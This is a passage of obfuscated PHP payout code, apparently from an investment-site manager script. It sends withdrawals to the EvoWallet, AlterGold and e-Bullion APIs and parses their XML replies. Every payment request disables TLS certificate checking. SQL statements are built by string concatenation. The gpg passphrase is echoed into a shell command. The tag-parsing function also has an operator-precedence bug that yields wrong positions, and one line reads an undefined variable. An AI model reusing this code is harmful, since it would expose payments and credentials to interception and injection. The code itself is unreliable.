          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcanbca ($elnlcykKb)
  {
    global $elnlcMVquv;
    $elnlcGryvK = array ();
    $elnlcFsom = elnlcqgtip ($elnlcykKb, 'response');
    if ($elnlcFsom != '')
    {
      $elnlcStjti = $elnlcFsom;
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = elnlcqgtip ($elnlcStjti, 'status');
      $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = elnlcqgtip ($elnlcJsEhC, 'statusmsg');
      $elnlcGryvK[$elnlcMVquv['elnlcNvcv']] = elnlcqgtip ($elnlcStjti, 'batch');
      $elnlcGryvK[$elnlcMVquv['elnlcprJRb']] = elnlcqgtip ($elnlcStjti, 'fromaccount');
      $elnlcGryvK[$elnlcMVquv['elnlcvswEV']] = elnlcqgtip ($elnlcStjti, 'toaccount');
      $elnlcGryvK[$elnlcMVquv['elnlcGRxou']] = elnlcqgtip ($elnlcStjti, 'amount');
      $elnlcGryvK[$elnlcMVquv['elnlcwBFz']] = elnlcqgtip ($elnlcStjti, 'currency');
      $elnlcGryvK[$elnlcMVquv['elnlcStvF']] = elnlcqgtip ($elnlcStjti, 'checksum');
      if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == 0)
      {
        $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWqNRN'];
      }
    }

    if (0 < $elnlcGryvK[$elnlcMVquv['elnlcxBlW']])
    {
      switch ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']])
      {
        case 10310:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10310: Invalid Account Prefix';
          break;
        }

        case 10311:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10311: Payer account has been suspended';
          break;
        }

        case 10312:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10312: API transfer disabled';
          break;
        }

        case 10313:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10313: Payee account not found';
          break;
        }

        case 10314:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10314: Payer spending over daily limit';
          break;
        }

        case 10315:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10315: Payee account has been suspended';
          break;
        }

        case 10316:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10316: Payee account has been limited';
          break;
        }

        case 10317:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10317: Spending less than minimum allowed';
          break;
        }

        case 10318:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10318: Payee will reach their balance limit';
          break;
        }

        case 10319:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10319: Payer do not have enough funds';
          break;
        }

        case 10320:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10320: Payee has an invalid balance security check';
          break;
        }

        case 10321:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10321: Spend was not complete';
          break;
        }

        case 10322:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10322: Payee account group not found';
          break;
        }

        case 10323:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10323: Invalid payee account';
          break;
        }

        case 10324:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10324: Invalid IP range';
          break;
        }

        case 10325:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10325: Invalid API or not enabled';
          break;
        }

        case 10326:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10326: Payer account group not found';
          break;
        }

        case 10327:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10327: Invalid payer account';
          break;
        }

        case 10328:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10328: Invalid checksum';
          break;
        }

        case 10110:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10110: Invalid Account Prefix';
          break;
        }

        case 10111:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10111: Account has been suspended';
          break;
        }

        case 10112:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10112: Invalid API or API not enabled';
          break;
        }

        case 10113:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10113: API balance query disabled';
          break;
        }

        case 10114:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10114: IP not in the allowed range';
          break;
        }

        case 10115:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10115: Balance can not be retrieved';
          break;
        }

        case 10116:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10116: Reserve';
          break;
        }

        case 10117:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10117: Account group not found';
          break;
        }

        case 10118:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10118: This account can not be found';
          break;
        }

        case 10119:
        {
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = '10119: Invalid Checksum';
          break;
        }
      }

      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWOAb'];
    }

    return $elnlcGryvK;
  }

  function elnlcazuv ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh, $elnlcwlnMC = 'USD')
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty EvoWallet account.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoWallet account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 24);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evowallet_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcHnpU = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }

        $elnlcTwmjz = $elnlcpvEj[$elnlcMVquv['elnlcTLJg']];
      }
      else
      {
        list ($elnlcHnpU, $elnlcTwmjz) = preg_split ('/\\|/', $elnlcgodh);
      }

      $elnlcTQnW = curl_init ();
      $elnlcqOBdb = date ($elnlcMVquv['elnlcvqBvK']);
      $elnlcJmOP = strtoupper (md5 ($elnlcTwmjz . $elnlcqOBdb . '103' . '' . $elnlcwlnMC . $elnlcpvEj[$elnlcMVquv['elnlcEgUg']] . $elnlcpGcN . $elnlcusGj . md5 ($elnlcHnpU)));
      $elnlcVtfRt = '<?xml version="1.0" encoding="utf-8"?>
<request>
<apiname>' . htmlentities ($elnlcTwmjz, ENT_NOQUOTES) . '</apiname>
<trandate>' . $elnlcqOBdb . '</trandate>
<trantype>103</trantype>
<tranid></tranid>
<curcode>' . $elnlcwlnMC . '</curcode>
<fromaccount>' . htmlentities ($elnlcpvEj[$elnlcMVquv['elnlcEgUg']], ENT_NOQUOTES) . '</fromaccount>
<toaccount>' . htmlentities ($elnlcpGcN, ENT_NOQUOTES) . '</toaccount>
<amount>' . htmlentities ($elnlcusGj, ENT_NOQUOTES) . '</amount>
<memo>' . htmlentities ($elnlcSFSSt, ENT_NOQUOTES) . '</memo> 
<checksum>' . $elnlcJmOP . '</checksum> 
</request>';
      $elnlcTQnW = curl_init ();
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://www.evowallet.com/api.php?req=' . urlencode ($elnlcVtfRt));
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcGryvK = elnlcanbca ($a);
      if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcJmVy'])
      {
        return array (1, '', $elnlcGryvK[$elnlcMVquv['elnlcNvcv']]);
      }
      else
      {
        if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcNEvp'])
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcGryvK[$elnlcMVquv['elnlcukssk']] . '<br>' . $elnlcGryvK[$elnlcMVquv['elnlcuNqG']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcivsiu ($elnlcgRSdK, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlterGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlterGold account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 17);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgRSdK == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'altergold_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcPJAlS = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        $elnlcPJAlS = $elnlcgRSdK;
      }

      $elnlcTQnW = curl_init ();
      $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://api.altergold.com/spend.php');
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, 'PAYER_ACCOUNT=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcrQRsi']]) . '&PAYER_PASSWORD=' . rawurlencode ($elnlcPJAlS) . '&PAYEE_ACCOUNT=' . rawurlencode ($elnlcpGcN) . '&PAYMENT_AMOUNT=' . rawurlencode ($elnlcusGj) . ('' . '&PAYMENT_CURRENCY=USD&MEMO=' . $elnlcSFSSt));
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      if ($a == '')
      {
        print 'Blank response from Altergold processor service.';
      }
      else
      {
        $elnlcGPKTB = array ('E10011' => 'Unable to Login as Payer. This means wrong login information was provided.', 'E10012' => 'Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.', 'E10013' => 'API Automated Spends not Enabled.', 'E10014' => 'Unable to authorize IP address.', 'E10015' => 'Recipient account not found', 'E10016' => 'Recipient account is suspended.', 'E10017' => 'Invalid spend units.', 'E10018' => 'Spend amount is too low.', 'E10019' => 'Recipient reached balance limit.', 'E10020' => 'Not enough funds.', 'E10021' => '* Please contact support.');
        if ($elnlcGPKTB[$a] != '')
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcGPKTB[$a]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ('' . ' ' . $elnlcGPKTB[$a]), '');
        }
        else
        {
          return array (1, '', $a);
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcieyo ($elnlcgamAb, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh, $elnlcJABR)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to e-Bullion account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid e-Bullion account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 5);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      $elnlcWlzwk = '<atip.batch.v1><payment.list>';
      $elnlcWlzwk = $elnlcWlzwk . '<payment>';
      $elnlcWlzwk = $elnlcWlzwk . '<payer>' . htmlentities ($elnlcpvEj[$elnlcMVquv['elnlceUVS']], ENT_NOQUOTES) . '</payer>';
      $elnlcWlzwk = $elnlcWlzwk . '<payee>' . htmlentities ($elnlcpGcN, ENT_NOQUOTES) . '</payee>';
      $elnlcWlzwk = $elnlcWlzwk . '<amount>' . htmlentities ($elnlcusGj, ENT_NOQUOTES) . '</amount>';
      $elnlcWlzwk = $elnlcWlzwk . '<metal>' . ($elnlcJABR == 5 ? 1 : 3) . '</metal>';
      $elnlcWlzwk = $elnlcWlzwk . '<unit>1</unit>';
      $elnlcWlzwk = $elnlcWlzwk . '<memo>' . htmlentities ($elnlcSFSSt, ENT_NOQUOTES) . '</memo>';
      $elnlcWlzwk = $elnlcWlzwk . '<ref></ref>';
      $elnlcWlzwk = $elnlcWlzwk . '</payment>';
      $elnlcWlzwk = $elnlcWlzwk . '</payment.list></atip.batch.v1>';
      $elnlcDMpy = tempnam ('./tmpl_c/', 'in.');
      $elnlcqqqH = tempnam ('./tmpl_c/', 'out.');
      $elnlcQpUA = fopen ($elnlcDMpy, $elnlcMVquv['elnlcFblun']);
      fwrite ($elnlcQpUA, $elnlcWlzwk);
      fclose ($elnlcQpUA);
      $elnlcmzhFy = './tmpl_c/';
      $elnlcucgP = escapeshellcmd ($elnlcpvEj[$elnlcMVquv['elnlcuIjsz']]);
      $elnlcBBFz = elnlcdxpe ($elnlcpvEj[$elnlcMVquv['elnlcBwJdT']], $elnlcMVquv['elnlcQlDcy']);
      $elnlcsESye = $elnlcpvEj[$elnlcMVquv['elnlcuMNtG']];
      $elnlcFabq = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcmzhFy . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0';
      $elnlcPjsxa = '' . 'echo \'' . $elnlcBBFz . '\' | ' . $elnlcucgP . ' ' . $elnlcFabq . ' --recipient A20077\\@e-bullion.com --local-user ' . $elnlcpvEj[$elnlcMVquv['elnlceUVS']] . ('' . '\\@e-bullion.com --output ' . $elnlcqqqH . ' --sign --encrypt ' . $elnlcDMpy . ' 2>&1');
      $elnlckIkl = '';
      $elnlcRUFiM = popen ('' . $elnlcPjsxa, 'r');
      while (!feof ($elnlcRUFiM))
      {
        $elnlckIkl = fgets ($elnlcRUFiM, 4096);
      }

      pclose ($elnlcRUFiM);
      $elnlcQpUA = fopen ($elnlcqqqH, $elnlcMVquv['elnlcyULNE']);
      $elnlcVuVC = fread ($elnlcQpUA, filesize ($elnlcqqqH));
      fclose ($elnlcQpUA);
      unlink ($elnlcDMpy);
      unlink ($elnlcqqqH);
      $elnlcJMfu = 'ATIP_ACCOUNT=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlceUVS']]) . '&ATIP_BATCH_MSG=' . rawurlencode ($elnlcVuVC) . '&ATIP_STATUS_URL=' . rawurlencode ($elnlcsESye);
      $elnlcTQnW = curl_init ();
      curl_setopt ($elnlcTQnW, CURLOPT_URL, '' . 'https://atip.e-bullion.com/batch.php?' . $elnlcJMfu);
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcTQnW, CURLOPT_HEADER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcuucWN = array ();
      $elnlcvNNJJ = '';
      if (preg_match ('/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/', $a, $elnlcuucWN))
      {
        $elnlcvNNJJ = $elnlcuucWN[1];
      }

      $elnlcvNNJJ = urldecode ($elnlcvNNJJ);
      $elnlcintNC = tempnam ('./tmpl_c/', 'xml.cert.');
      $elnlcPvfG = tempnam ('./tmpl_c/', 'xml.tmp.');
      $elnlcQpUA = fopen ('' . $elnlcPvfG, $elnlcMVquv['elnlcFblun']);
      fwrite ($elnlcQpUA, $elnlcvNNJJ);
      fclose ($elnlcQpUA);
      $elnlcFabq = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcmzhFy . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0';
      $elnlcPjsxa = '' . 'echo \'' . $elnlcBBFz . '\' | ' . $elnlcucgP . ' ' . $elnlcFabq . ' --output ' . $elnlcintNC . ' --decrypt ' . $elnlcPvfG . ' 2>&1';
      $elnlckIkl = '';
      $elnlcHJbm = '';
      $elnlcRUFiM = popen ('' . $elnlcPjsxa, 'r');
      while (!feof ($elnlcRUFiM))
      {
        $elnlckIkl = fgets ($elnlcRUFiM, 4096);
        $elnlcnnsn = strstr ($elnlckIkl, 'key ID');
        if (0 < strlen ($elnlcnnsn))
        {
          $elnlcHJbm = preg_replace ('/[\\n\\r]/', '', substr ($elnlcnnsn, 7));
          continue;
        }
      }

      pclose ($elnlcRUFiM);
      if ($elnlcHJbm == $elnlcpvEj[$elnlcMVquv['elnlcGqHlf']])
      {
        if (is_file ('' . $elnlcintNC))
        {
          $elnlcgtkI = fopen ('' . $elnlcintNC, $elnlcMVquv['elnlcyULNE']);
          $elnlcykKb = fread ($elnlcgtkI, filesize ('' . $elnlcintNC));
          fclose ($elnlcgtkI);
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Can not found decrypted verification response!');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ' Can not found decrypted verification response!', '');
        }

        $elnlcVtfRt = elnlcitjqh ($elnlcykKb);
        if ($elnlcVtfRt[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcJmVy'])
        {
          return array (1, '', $elnlcVtfRt[$elnlcMVquv['elnlcNvcv']]);
        }
        else
        {
          if ($elnlcVtfRt[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcNEvp'])
          {
            $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcVtfRt[$elnlcMVquv['elnlcukssk']] . ' ' . $elnlcVtfRt[$elnlcMVquv['elnlcuNqG']]);
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcvubh . $elnlcVtfRt[$elnlcMVquv['elnlcukssk']] . ' ' . $elnlcVtfRt[$elnlcMVquv['elnlcuNqG']]);
          }
          else
          {
            $e = elnlckjnjt ('' . $elnlcvubh . ' Unknown error');
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcvubh . ' Unknown error', '');
          }
        }
      }
      else
      {
        $e = elnlckjnjt ('' . $elnlcvubh . ' Can not decrypt verification response! ');
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcvubh . ' Can not decrypt verification response!', '');
      }

      unlink ($elnlcPvfG);
      unlink ($elnlcintNC);
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available', '');
    }

  }

  function elnlcqgtip ($elnlcVtfRt, $elnlcCOPf)
  {
    global $elnlcMVquv;
    $elnlcCOPf = strtolower ($elnlcCOPf);
    $elnlcJMcCm = strlen ($elnlcCOPf) + 2;
    if ($elnlcxoJz = strpos ($elnlcVtfRt, '' . '<' . $elnlcCOPf . '>') === false)
    {
      return '';
    }

    if ($elnlcBbyL = strpos ($elnlcVtfRt, '' . '</' . $elnlcCOPf . '>') === false)
    {
      return '';
    }

    $elnlcKDxqb = trim (substr ($elnlcVtfRt, $elnlcxoJz + $elnlcJMcCm, $elnlcBbyL - ($elnlcxoJz + $elnlcJMcCm)));
    return $elnlcKDxqb;
  }

  function elnlcitjqh ($elnlcykKb)
  {
    global $elnlcMVquv;
    $elnlcGryvK = array ();
    $elnlcEPqF = elnlcqgtip ($elnlcykKb, 'balanceresponse.list');
    if ($elnlcEPqF != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcuJWb'];
      $elnlcJGFJ = false;
      if ($elnlcqSpb = stristr ($elnlcEPqF, '<balance>') === false)
      {
        $elnlcJGFJ = true;
      }
      else
      {
        $elnlcxoJz = strlen ($elnlcEPqF) - strlen ($elnlcqSpb);
      }

      if ($elnlcAzaKT = stristr ($elnlcEPqF, '</balance>') === false)
      {
        $elnlcJGFJ = true;
      }
      else
      {
        $elnlcBbyL = strlen ($elnlcEPqF) - strlen ($elnlcAzaKT);
      }

      while (!$elnlcJGFJ)
      {
        $elnlcGaInM = trim (substr ($elnlcEPqF, $elnlcxoJz + 9, $elnlcBbyL - 9));
        $elnlcEPqF = trim (substr ($elnlcEPqF, $elnlcBbyL + 10));
        $elnlcGryvK[$elnlcMVquv['elnlcGRxou']] = elnlcqgtip ($elnlcGaInM, 'amount');
        if ($elnlcqSpb = stristr ($elnlcEPqF, '<balance>') === false)
        {
          $elnlcJGFJ = true;
        }
        else
        {
          $elnlcxoJz = strlen ($elnlcEPqF) - strlen ($elnlcqSpb);
        }

        if ($elnlcAzaKT = stristr ($elnlcEPqF, '</balance>') === false)
        {
          $elnlcJGFJ = true;
          continue;
        }
        else
        {
          $elnlcBbyL = strlen ($elnlcEPqF) - strlen ($elnlcAzaKT);
          continue;
        }
      }
    }

    $elnlcFsom = elnlcqgtip ($elnlcykKb, 'verified.list');
    if ($elnlcFsom != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWqNRN'];
      $elnlcJGFJ = false;
      if ($elnlcqSpb = stristr ($elnlcFsom, '<transaction>') === false)
      {
        $elnlcJGFJ = true;
      }
      else
      {
        $elnlcxoJz = strlen ($elnlcFsom) - strlen ($elnlcqSpb);
      }

      if ($elnlcAzaKT = stristr ($elnlcFsom, '</transaction>') === false)
      {
        $elnlcJGFJ = true;
      }
      else
      {
        $elnlcBbyL = strlen ($elnlcFsom) - strlen ($elnlcAzaKT);
      }

      while (!$elnlcJGFJ)
      {
        $elnlcStjti = trim (substr ($elnlcFsom, $elnlcxoJz + 13, $elnlcBbyL - 13));
        $elnlcFsom = trim (substr ($elnlcFsom, $elnlcBbyL + 14));
        $elnlcGryvK[$elnlcMVquv['elnlcNvcv']] = elnlcqgtip ($elnlcStjti, 'id');
        $elnlcGryvK[$elnlcMVquv['elnlcvswEV']] = elnlcqgtip ($elnlcStjti, 'payee');
        $elnlcGryvK[$elnlcMVquv['elnlcprJRb']] = elnlcqgtip ($elnlcStjti, 'payer');
        $elnlcGryvK[$elnlcMVquv['elnlcGRxou']] = elnlcqgtip ($elnlcStjti, 'amount');
        $elnlcGryvK[$elnlcMVquv['elnlcrfTtw']] = elnlcqgtip ($elnlcStjti, 'metal');
        $elnlcGryvK[$elnlcMVquv['elnlcghumz']] = elnlcqgtip ($elnlcStjti, 'unit');
        $elnlcGryvK[$elnlcMVquv['elnlcmvxLS']] = elnlcqgtip ($elnlcStjti, 'memo');
        $elnlcGryvK[$elnlcMVquv['elnlcLpci']] = elnlcqgtip ($elnlcStjti, 'exchange');
        $elnlcGryvK[$elnlcMVquv['elnlcayQli']] = elnlcqgtip ($elnlcStjti, 'fee');
        if ($elnlcqSpb = stristr ($elnlcFsom, '<transaction>') === false)
        {
          $elnlcJGFJ = true;
        }
        else
        {
          $elnlcxoJz = strlen ($elnlcFsom) - strlen ($elnlcqSpb);
        }

        if ($elnlcAzaKT = stristr ($elnlcFsom, '</transaction>') === false)
        {
          $elnlcJGFJ = true;
          continue;
        }
        else
        {
          $elnlcBbyL = strlen ($elnlcFsom) - strlen ($elnlcAzaKT);
          continue;
        }
      }
    }

    $elnlcvruS = elnlcqgtip ($elnlcykKb, 'failed.list');
    if ($elnlcvruS != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWOAb'];
      $elnlcJGFJ = false;
      if ($elnlcqSpb = stristr ($elnlcvruS, '<failed>') === false)
      {
        $elnlcJGFJ = true;
      }
      else
      {
        $elnlcxoJz = strlen ($elnlcvruS) - strlen ($elnlcqSpb);
      }

      if ($elnlcAzaKT = stristr ($elnlcvruS, '</failed>') === false)
      {
        $elnlcJGFJ = true;
      }
      else
      {
        $elnlcBbyL = strlen ($elnlcvruS) - strlen ($elnlcAzaKT);
      }

      while (!$elnlcJGFJ)
      {
        $elnlczdoz = trim (substr ($elnlcvruS, $elnlcxoJz + 13, $elnlcBbyL - 13));
        $elnlcvruS = trim (substr ($elnlcvruS, $elnlcBbyL + 14));
        $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = elnlcqgtip ($elnlczdoz, 'error');
        if ($elnlcqSpb = stristr ($elnlcvruS, '<failed>') === false)
        {
          $elnlcJGFJ = true;
        }
        else
        {
          $elnlcxoJz = strlen ($elnlcvruS) - strlen ($elnlcqSpb);
        }

        if ($elnlcAzaKT = stristr ($elnlcvruS, '</failed>') === false)
        {
          $elnlcJGFJ = true;
          continue;
        }
        else
        {
          $elnlcBbyL = strlen ($elnlcvruS) - strlen ($elnlcAzaKT);
          continue;
        }
      }
    }

    $elnlcDitBg = elnlcqgtip ($elnlcykKb, 'errorresponse.list');
    if ($elnlcDitBg != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWOAb'];
      $elnlcJGFJ = false;
      if ($elnlcqSpb = stristr ($elnlcDitBg, '<errorresponse>') === false)
      {
        $elnlcJGFJ = true;
      }
      else
      {
        $elnlcxoJz = strlen ($elnlcDitBg) - strlen ($elnlcqSpb);
      }

      if ($elnlcAzaKT = stristr ($elnlcDitBg, '</errorresponse>') === false)
      {
        $elnlcJGFJ = true;
      }
      else
      {
        $elnlcBbyL = strlen ($elnlcDitBg) - strlen ($elnlcAzaKT);
      }

      while (!$elnlcJGFJ)
      {
        $elnlcNJga = trim (substr ($elnlcDitBg, $elnlcxoJz + 15, $elnlcBbyL - 15));
        $elnlcasmAP = false;
        if ($elnlckPIf = stristr ($elnlcNJga, '<error>') === false)
        {
          $elnlcasmAP = true;
        }
        else
        {
          $elnlcDrTmM = strlen ($elnlcNJga) - strlen ($elnlckPIf);
        }

        if ($elnlckjdh = stristr ($elnlcNJga, '</error>') === false)
        {
